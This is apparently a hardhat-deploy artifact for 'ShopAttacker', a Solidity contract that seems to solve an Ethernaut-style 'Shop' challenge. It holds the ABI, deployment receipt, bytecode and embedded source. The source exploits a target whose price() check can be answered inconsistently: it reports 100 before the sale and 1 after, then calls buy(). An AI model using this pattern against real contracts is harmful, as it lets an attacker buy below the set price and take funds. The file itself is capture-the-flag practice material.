@@ -1,0 +1,128 @@
+{
+  "address": "0xEA8384919985f2d79eC4b8E46172915148bCD41F",
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "_shopAddress",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "attack",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "owner",
+      "outputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "price",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "target",
+      "outputs": [
+        {
+          "internalType": "contract IShop",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ],
+  "transactionHash": "0xe7e6ca696bca1a6033b299cd38490f8db9f0ba1f936fbb2be84ca0f726375703",
+  "receipt": {
+    "to": null,
+    "from": "0xcC6eDeB501BbD8AD9E028BDe937B63Cdd64A1D91",
+    "contractAddress": "0xEA8384919985f2d79eC4b8E46172915148bCD41F",
+    "transactionIndex": 79,
+    "gasUsed": "214516",
+    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+    "blockHash": "0x8785baead9539313b4bd7a20081aeb128fd171a445b09bfa860f093086acf6bf",
+    "transactionHash": "0xe7e6ca696bca1a6033b299cd38490f8db9f0ba1f936fbb2be84ca0f726375703",
+    "logs": [],
+    "blockNumber": 8200725,
+    "cumulativeGasUsed": "7304960",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [
+    "0x93A0Db7Be139A06471Cb4282A79175b32Db2E9BA"
+  ],
+  "numDeployments": 1,
+  "solcInputHash": "82c1ba97006dd815646cb7fe17fc54df",
+  "metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_shopAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"price\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"target\",\"outputs\":[{\"internalType\":\"contract IShop\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/ShopAttacker.sol\":\"ShopAttacker\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/ShopAttacker.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ninterface IShop {\\n    function isSold() external view returns (bool);\\n    function buy() external;\\n}\\n\\n\\ncontract ShopAttacker {\\n    address public owner;\\n    IShop public target;\\n    \\n\\n    constructor(address _shopAddress){\\n        owner = msg.sender;\\n        target = IShop(_shopAddress);\\n    }\\n\\n    modifier onlyOwner {\\n    require(msg.sender == owner);\\n    _;\\n    }\\n\\n\\n    function price() external view returns (uint256){\\n        if(!target.isSold()){\\n            return 100;\\n        } else {\\n            return 1;\\n        }\\n    }\\n\\n    function attack() public onlyOwner{\\n        target.buy();\\n    }\\n}\",\"keccak256\":\"0x2d1d0831efd9a6d82977f9e333dd83bd3d8324212b4c8465ff138e4fcef83f06\",\"license\":\"MIT\"}},\"version\":1}",
+  "bytecode": "0x608060405234801561001057600080fd5b506040516102b33803806102b383398101604081905261002f91610062565b60008054336001600160a01b031991821617909155600180549091166001600160a01b0392909216919091179055610092565b60006020828403121561007457600080fd5b81516001600160a01b038116811461008b57600080fd5b9392505050565b610212806100a16000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c80638da5cb5b146100515780639e5faafc14610081578063a035b1fe1461008b578063d4b83992146100a1575b600080fd5b600054610064906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b6100896100b4565b005b610093610135565b604051908152602001610078565b600154610064906001600160a01b031681565b6000546001600160a01b031633146100cb57600080fd5b600160009054906101000a90046001600160a01b03166001600160a01b031663a6f2ae3a6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561011b57600080fd5b505af115801561012f573d6000803e3d6000fd5b50505050565b6001546040805163e852e74160e01b815290516000926001600160a01b03169163e852e7419160048083019260209291908290030181865afa15801561017f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101a391906101b3565b6101ad5750606490565b50600190565b6000602082840312156101c557600080fd5b815180151581146101d557600080fd5b939250505056fea2646970667358221220a31e957b6f1b0fd163c75178c915a5dcbb488d0a58040ccbfaee1c38d19c67bf64736f6c63430008140033",
+  "deployedBytecode": "0x608060405234801561001057600080fd5b506004361061004c5760003560e01c80638da5cb5b146100515780639e5faafc14610081578063a035b1fe1461008b578063d4b83992146100a1575b600080fd5b600054610064906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b6100896100b4565b005b610093610135565b604051908152602001610078565b600154610064906001600160a01b031681565b6000546001600160a01b031633146100cb57600080fd5b600160009054906101000a90046001600160a01b03166001600160a01b031663a6f2ae3a6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561011b57600080fd5b505af115801561012f573d6000803e3d6000fd5b50505050565b6001546040805163e852e74160e01b815290516000926001600160a01b03169163e852e7419160048083019260209291908290030181865afa15801561017f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101a391906101b3565b6101ad5750606490565b50600190565b6000602082840312156101c557600080fd5b815180151581146101d557600080fd5b939250505056fea2646970667358221220a31e957b6f1b0fd163c75178c915a5dcbb488d0a58040ccbfaee1c38d19c67bf64736f6c63430008140033",
+  "devdoc": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {},
+    "version": 1
+  },
+  "storageLayout": {
+    "storage": [
+      {
+        "astId": 12,
+        "contract": "contracts/ShopAttacker.sol:ShopAttacker",
+        "label": "owner",
+        "offset": 0,
+        "slot": "0",
+        "type": "t_address"
+      },
+      {
+        "astId": 15,
+        "contract": "contracts/ShopAttacker.sol:ShopAttacker",
+        "label": "target",
+        "offset": 0,
+        "slot": "1",
+        "type": "t_contract(IShop)10"
+      }
+    ],
+    "types": {
+      "t_address": {
+        "encoding": "inplace",
+        "label": "address",
+        "numberOfBytes": "20"
+      },
+      "t_contract(IShop)10": {
+        "encoding": "inplace",
+        "label": "contract IShop",
+        "numberOfBytes": "20"
+      }
+    }
+  }
+}
